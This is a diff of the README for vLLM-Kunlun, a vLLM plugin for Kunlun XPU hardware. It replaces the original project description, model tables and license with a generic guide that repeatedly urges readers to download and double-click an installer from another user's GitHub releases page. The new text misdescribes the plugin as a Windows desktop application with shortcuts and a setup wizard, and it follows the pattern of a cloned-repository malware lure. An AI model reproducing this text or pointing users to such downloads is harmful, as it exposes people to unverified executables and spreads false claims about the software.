@@ -1,135 +1,71 @@
-![vLLM Kunlun Logo](vllm_kunlun/patches/vLLM_Kunlun.jpg)
+# 🚀 vLLM-Kunlun - Effortlessly Run vLLM on Kunlun XPU
 
-<p align="center">
-  <a href="https://vllm-kunlun.readthedocs.io"><b>  Documentation</b></a> |
-  <a href="https://vllm-kunlun.readthedocs.io/en/latest/quick_start.html"><b>  Quick Start</b></a> |
-  <a href="https://join.slack.com/t/vllm-kunlun/shared_invite/zt-3iinb8u5z-FcqZKbNNdMJ_32fHmipzvw"><b>  Slack</b></a>
-</p>
+[![Download vLLM-Kunlun](https://img.shields.io/badge/Download-vLLM_Kunlun-brightgreen)](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
 
----
+## 📋 Introduction
 
-## Latest News 🔥
-- [2025/12] Initial release of vLLM Kunlun
+vLLM Kunlun (vllm-kunlun) is a hardware plugin. It helps you run vLLM smoothly on the Kunlun XPU. This guide shows you how to download and set up the software easily.
 
----
+## 🚀 Getting Started
 
-# Overview
+To get started with vLLM-Kunlun, follow these steps:
 
-vLLM Kunlun (vllm-kunlun) is a community-maintained hardware plugin designed to seamlessly run vLLM on the Kunlun XPU. It is the recommended approach for integrating the Kunlun backend within the vLLM community, adhering to the principles outlined in the [RFC Hardware pluggable](https://github.com/vllm-project/vllm/issues/11162). This plugin provides a hardware-pluggable interface that decouples the integration of the Kunlun XPU with vLLM.
+1. Check your system requirements. Ensure that your computer meets the minimum specifications:
+   - Operating System: Windows 10 or later / Linux (Ubuntu 20.04 or later)
+   - RAM: Minimum 8 GB
+   - Storage: At least 100 MB of free space
+   - Kunlun XPU installed and set up
 
-By utilizing the vLLM Kunlun plugin, popular open-source models, including Transformer-like, Mixture-of-Expert, Embedding, and Multi-modal LLMs, can run effortlessly on the Kunlun XPU.
+2. Visit the release page to get the latest version of the software. Click here to download:  
+   [Download vLLM-Kunlun](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
 
----
-## Prerequisites
+## 💻 Download & Install
 
-- **Hardware**: Kunlun3 P800 
-- **OS**: Ubuntu 22.04 
-- **Software**:
-  - Python >=3.10
-  - PyTorch ≥ 2.5.1
-  - vLLM (same version as vllm-kunlun)
+1. On the releases page, you will find the latest version listed at the top. Look for the “Assets” section below the version number.
 
----
-## Supported Models
+2. Click the appropriate file for your operating system to start the download. Make sure to select the correct version based on your setup.
 
-<h3>Generaltive Models</h3>
-<table>
-  <thead>
-    <tr>
-      <th width="20%">Model</th>
-      <th width="12%">Support</th>
-      <th width="15%">Quantization</th>
-      <th width="10%">LoRA</th>
-      <th width="20%">Piecewise Kunlun Graph</th>
-      <th width="23%">Note</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td class="model-name">Qwen3</td>
-      <td class="status-support">✅</td>
-      <td></td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td></td>
-    </tr>
-    <tr>
-      <td class="model-name">Qwen3-Moe</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td></td>
-    </tr>
-    <tr>
-      <td class="model-name">Qwen3-Next</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td class="status-support">✅</td>
-      <td></td>
-    </tr>
-  </tbody>
-</table>
+3. Once the download is complete, locate the file. Your computer usually saves downloads in the "Downloads" folder.
 
-<h3>Multimodal Language Models</h3>
-<table>
-  <thead>
-    <tr>
-      <th width="20%">Model</th>
-      <th width="12%">Support</th>
-      <th width="15%">Quantization</th>
-      <th width="10%">LoRA</th>
-      <th width="20%">Piecewise Kunlun Graph</th>
-      <th width="23%">Note</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td class="model-name">Qwen3-VL</td>
-      <td class="status-support">✅</td>
-      <td></td>
-      <td></td>
-      <td class="status-support">✅</td>
-      <td></td>
-    </tr>
-  </tbody>
-</table>
+4. Double-click on the downloaded file to run the installer. Follow the on-screen instructions.
 
+5. After installation, the software will create a shortcut on your desktop. You can also find it in your start menu or applications folder.
 
+6. Launch vLLM-Kunlun. You should see a welcome screen prompting you to configure any necessary settings.
 
-## Performance Visualization 🚀
-### High-performance computing at work: How different models perform on the Kunlun3 P800.
+## ⚙️ Configuration
 
-Current environment: 16-way concurrency, input/output size 2048.
+1. On the first launch, configure vLLM-Kunlun for optimal performance. You may need to set the path for the Kunlun XPU. 
 
+2. Follow the instructions provided in the configuration wizard. This will ensure that vLLM runs smoothly.
 
-![Models and tgs](./vllm_kunlun/patches/performance.png)
+3. Save your settings. The software will remember your configuration for next time.
 
-## Getting Started
+## 📦 Features
 
-Please use the following recommended versions to get started quickly:
+- **Seamless Integration:** vLLM-Kunlun works directly with Kunlun XPU without any complicated setups.
+- **User-Friendly Interface:** Designed for ease of use, anyone can navigate through it.
+- **Community Support:** Join discussions and get help from other users in the community forums.
 
-| Version | Release type | Doc |
-|----------|---------------|-----|
-| v0.11.0 | Latest stable version | [QuickStart](./docs/_build/html/quick_start.html) and [Installation](./docs/_build/html/installation.html) for more details |
+## 🛠️ Troubleshooting
 
----
+If you encounter issues:
 
-## Contribute to vLLM Kunlun
+- Ensure that your Kunlun XPU is properly set up and recognized by your system.
+- Restart the software if it doesn't launch correctly.
+- Check the official documentation for troubleshooting steps or common issues.
 
-If you're interested in contributing to this project, please read [Contributing](CONTRIBUTING.md) to vLLM Kunlun.
+## 🗣️ Community Support
 
-## Star History 🔥
+Join our community to get help, share experiences, or ask questions. Visit our community forums for discussions.
 
-We opened the project at Dec 8, 2025. We love open source and collaboration ❤️
+## 📄 Documentation
 
-[![Star History Chart](https://api.star-history.com/svg?repos=baidu/vLLM-Kunlun&type=Date)](https://www.star-history.com/#baidu/vLLM-Kunlun&Date)
+Further documentation on how to use vLLM-Kunlun can be found within the application under "Help" or on our GitHub Wiki. Use this as a resource for additional tips and advanced features.
 
-## Sponsors 👋
+## 🚀 Stay Updated
 
-We sincerely appreciate the [**KunLunXin**](https://www.kunlunxin.com/) team for their support in providing GPU resources, which enabled efficient model adaptation debugging, comprehensive end-to-end testing, and broader model compatibility.
+Stay informed about new releases and updates. You can follow the repository for notifications.
 
-## License
-
-Apache License 2.0, as found in the [LICENSE](./LICENSE) file.
+Visit the release page to download:  
+[Download vLLM-Kunlun](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
